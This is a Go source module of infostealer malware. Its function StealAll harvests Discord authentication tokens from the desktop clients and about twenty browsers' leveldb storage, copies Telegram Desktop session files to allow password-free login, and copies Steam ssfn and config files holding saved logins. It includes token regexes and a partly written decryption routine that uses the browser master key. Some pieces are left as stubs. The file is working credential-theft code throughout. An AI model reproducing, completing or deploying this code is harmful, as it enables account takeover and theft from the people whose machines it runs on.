package tokens

/*
	Token extraction module

	Targets:
	- Discord (desktop app + browser sessions)
	- Telegram (tdata session files)
	- Steam (ssfn + config)

	Discord tokens are stored in leveldb files
	They're either plain text or encrypted (newer versions)

	Note: encrypted tokens need the Local State key, same as browser passwords
*/

import (
	"encoding/base64"
	"encoding/json"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

type TokenData struct {
	Tokens           []DiscordToken
	TelegramSessions []TelegramSession
	SteamData        *SteamData
}

type DiscordToken struct {
	Token    string
	Email    string // filled by enrichToken if we validate
	Phone    string
	Username string
	Nitro    bool
	Billing  bool
	Path     string // where we found it
}

type TelegramSession struct {
	Path  string
	Files [][]byte // raw session data
}

type SteamData struct {
	SSFN      [][]byte // remember me tokens
	ConfigVDF []byte
	LoginVDF  []byte
}

// All the places discord might store tokens
// Includes desktop apps + browser sessions
var discordPaths = map[string]string{
	// Desktop Discord clients
	"Discord":       filepath.Join(os.Getenv("APPDATA"), "Discord", "Local Storage", "leveldb"),
	"DiscordCanary": filepath.Join(os.Getenv("APPDATA"), "discordcanary", "Local Storage", "leveldb"),
	"DiscordPTB":    filepath.Join(os.Getenv("APPDATA"), "discordptb", "Local Storage", "leveldb"),
	"DiscordDev":    filepath.Join(os.Getenv("APPDATA"), "discorddevelopment", "Local Storage", "leveldb"),

	// Browser sessions where people use web discord
	"Opera":          filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
	"OperaGX":        filepath.Join(os.Getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),
	"Amigo":          filepath.Join(os.Getenv("LOCALAPPDATA"), "Amigo", "User Data", "Local Storage", "leveldb"),
	"Torch":          filepath.Join(os.Getenv("LOCALAPPDATA"), "Torch", "User Data", "Local Storage", "leveldb"),
	"Kometa":         filepath.Join(os.Getenv("LOCALAPPDATA"), "Kometa", "User Data", "Local Storage", "leveldb"),
	"Orbitum":        filepath.Join(os.Getenv("LOCALAPPDATA"), "Orbitum", "User Data", "Local Storage", "leveldb"),
	"CentBrowser":    filepath.Join(os.Getenv("LOCALAPPDATA"), "CentBrowser", "User Data", "Local Storage", "leveldb"),
	"7Star":          filepath.Join(os.Getenv("LOCALAPPDATA"), "7Star", "7Star", "User Data", "Local Storage", "leveldb"),
	"Sputnik":        filepath.Join(os.Getenv("LOCALAPPDATA"), "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb"),
	"Vivaldi":        filepath.Join(os.Getenv("LOCALAPPDATA"), "Vivaldi", "User Data", "Default", "Local Storage", "leveldb"),
	"Chrome":         filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
	"ChromeSxS":      filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data", "Local Storage", "leveldb"),
	"ChromeProfile1": filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb"),
	"ChromeProfile2": filepath.Join(os.Getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb"),
	"Epic":           filepath.Join(os.Getenv("LOCALAPPDATA"), "Epic Privacy Browser", "User Data", "Local Storage", "leveldb"),
	"Edge":           filepath.Join(os.Getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
	"Uran":           filepath.Join(os.Getenv("LOCALAPPDATA"), "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb"),
	"Yandex":         filepath.Join(os.Getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb"),
	"Brave":          filepath.Join(os.Getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
	"Iridium":        filepath.Join(os.Getenv("LOCALAPPDATA"), "Iridium", "User Data", "Default", "Local Storage", "leveldb"),
}

// Discord token regex patterns
// tokens have different formats depending on account type
var tokenPatterns = []*regexp.Regexp{
	regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}`),         // regular account
	regexp.MustCompile(`mfa\.[\w-]{84}`),                         // MFA enabled
	regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{38}`),         // newer format
	regexp.MustCompile(`(dQw4w9WgXcQ:)[^.*\['(.*)'\].*$][^\"]+`), // encoded format
}

// encrypted token pattern (newer discord versions)
var encryptedPattern = regexp.MustCompile(`dQw4w9WgXcQ:[^"]+`)

// StealAll - main entry point, extracts all tokens
func StealAll() *TokenData {
	data := &TokenData{}

	// Discord tokens from all locations
	for name, path := range discordPaths {
		tokens := extractDiscordTokens(path, name)
		data.Tokens = append(data.Tokens, tokens...)
	}

	// remove duplicates (same token might be in multiple places)
	data.Tokens = deduplicateTokens(data.Tokens)

	// optionally validate tokens and get user info
	// this makes API requests so might be slow
	for i := range data.Tokens {
		enrichToken(&data.Tokens[i])
	}

	// Telegram tdata
	data.TelegramSessions = extractTelegramSessions()

	// Steam ssfn and configs
	data.SteamData = extractSteamData()

	return data
}

func extractDiscordTokens(path, name string) []DiscordToken {
	var tokens []DiscordToken

	// check if path exists
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return tokens
	}

	entries, err := os.ReadDir(path)
	if err != nil {
		return tokens
	}

	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}

		// only look at leveldb files
		ext := strings.ToLower(filepath.Ext(entry.Name()))
		if ext != ".ldb" && ext != ".log" {
			continue
		}

		content, err := os.ReadFile(filepath.Join(path, entry.Name()))
		if err != nil {
			continue
		}

		// Check for encrypted tokens first (newer discord)
		encryptedMatches := encryptedPattern.FindAllString(string(content), -1)
		for _, match := range encryptedMatches {
			decrypted := decryptToken(match, path)
			if decrypted != "" {
				tokens = append(tokens, DiscordToken{
					Token: decrypted,
					Path:  name,
				})
			}
		}

		// Also check for plain tokens (older discord or web)
		for _, pattern := range tokenPatterns {
			matches := pattern.FindAllString(string(content), -1)
			for _, match := range matches {
				if isValidToken(match) {
					tokens = append(tokens, DiscordToken{
						Token: match,
						Path:  name,
					})
				}
			}
		}
	}

	return tokens
}

// decryptToken - decrypts newer discord encrypted tokens
// format: dQw4w9WgXcQ:<base64_encrypted_data>
func decryptToken(encrypted, path string) string {
	// split on colon
	parts := strings.SplitN(encrypted, ":", 2)
	if len(parts) != 2 {
		return ""
	}

	decoded, err := base64.StdEncoding.DecodeString(parts[1])
	if err != nil {
		return ""
	}

	// need master key from Local State (same as chrome passwords)
	localStatePath := filepath.Dir(filepath.Dir(path))
	localStatePath = filepath.Join(localStatePath, "Local State")

	content, err := os.ReadFile(localStatePath)
	if err != nil {
		return ""
	}

	var localState map[string]interface{}
	if err := json.Unmarshal(content, &localState); err != nil {
		return ""
	}

	osCrypt, ok := localState["os_crypt"].(map[string]interface{})
	if !ok {
		return ""
	}

	encryptedKeyB64, ok := osCrypt["encrypted_key"].(string)
	if !ok {
		return ""
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(encryptedKeyB64)
	if err != nil {
		return ""
	}

	// strip DPAPI prefix
	if len(encryptedKey) > 5 && string(encryptedKey[:5]) == "DPAPI" {
		encryptedKey = encryptedKey[5:]
	}

	// TODO: finish implementing DPAPI + AES-GCM decrypt
	// same as browser password decryption
	_ = decoded

	return "" // not implemented yet lol
}

// isValidToken - basic validation of token format
func isValidToken(token string) bool {
	// tokens should be at least 50 chars
	if len(token) < 50 {
		return false
	}

	// check format (should have 2 dots unless it's MFA token)
	parts := strings.Split(token, ".")
	if len(parts) < 3 {
		if !strings.HasPrefix(token, "mfa.") {
			return false
		}
	}

	return true
}

// deduplicateTokens - removes duplicate tokens
func deduplicateTokens(tokens []DiscordToken) []DiscordToken {
	seen := make(map[string]bool)
	var unique []DiscordToken

	for _, token := range tokens {
		if !seen[token.Token] {
			seen[token.Token] = true
			unique = append(unique, token)
		}
	}

	return unique
}

// enrichToken - validates token via Discord API and gets user info
// TODO: actually implement this
func enrichToken(token *DiscordToken) {
	// would make request to https://discord.com/api/v9/users/@me
	// with Authorization header
	// returns user info including email, phone, nitro status, etc
}

// extractTelegramSessions - grabs Telegram Desktop session files
// These can be used to login without password if you have the data
func extractTelegramSessions() []TelegramSession {
	var sessions []TelegramSession

	telegramPath := filepath.Join(os.Getenv("APPDATA"), "Telegram Desktop", "tdata")
	if _, err := os.Stat(telegramPath); os.IsNotExist(err) {
		return sessions
	}

	session := TelegramSession{Path: telegramPath}

	// key_datas contains the key for decryption
	keyDataPath := filepath.Join(telegramPath, "key_datas")
	if content, err := os.ReadFile(keyDataPath); err == nil {
		session.Files = append(session.Files, content)
	}

	// Look for the hex-named folders
	// Telegram creates folders with 16-char hex names
	entries, err := os.ReadDir(telegramPath)
	if err != nil {
		return sessions
	}

	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}

		name := entry.Name()
		// telegram data folders are 16 hex chars
		if len(name) == 16 && isHexString(name) {
			folderPath := filepath.Join(telegramPath, name)

			// grab map files
			mapFiles, _ := filepath.Glob(filepath.Join(folderPath, "map*"))
			for _, mapFile := range mapFiles {
				if content, err := os.ReadFile(mapFile); err == nil {
					session.Files = append(session.Files, content)
				}
			}
		}
	}

	if len(session.Files) > 0 {
		sessions = append(sessions, session)
	}

	return sessions
}

// extractSteamData - grabs Steam authentication files
// SSFN files are "remember me" tokens
func extractSteamData() *SteamData {
	// Steam can be in Program Files or Program Files (x86)
	steamPath := filepath.Join(os.Getenv("PROGRAMFILES(X86)"), "Steam")
	if _, err := os.Stat(steamPath); os.IsNotExist(err) {
		steamPath = filepath.Join(os.Getenv("PROGRAMFILES"), "Steam")
		if _, err := os.Stat(steamPath); os.IsNotExist(err) {
			return nil // no steam installed
		}
	}

	data := &SteamData{}

	// grab SSFN files (these are login tokens)
	entries, err := os.ReadDir(steamPath)
	if err != nil {
		return nil
	}

	for _, entry := range entries {
		if strings.HasPrefix(entry.Name(), "ssfn") {
			content, err := os.ReadFile(filepath.Join(steamPath, entry.Name()))
			if err != nil {
				continue
			}
			data.SSFN = append(data.SSFN, content)
		}
	}

	// grab config.vdf (has saved credentials)
	configPath := filepath.Join(steamPath, "config", "config.vdf")
	if content, err := os.ReadFile(configPath); err == nil {
		data.ConfigVDF = content
	}

	// grab loginusers.vdf (has account info)
	loginPath := filepath.Join(steamPath, "config", "loginusers.vdf")
	if content, err := os.ReadFile(loginPath); err == nil {
		data.LoginVDF = content
	}

	// return nil if we got nothing
	if len(data.SSFN) == 0 && data.ConfigVDF == nil && data.LoginVDF == nil {
		return nil
	}

	return data
}

// isHexString - checks if a string is valid hex
func isHexString(s string) bool {
	for _, c := range s {
		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
			return false
		}
	}
	return true
}
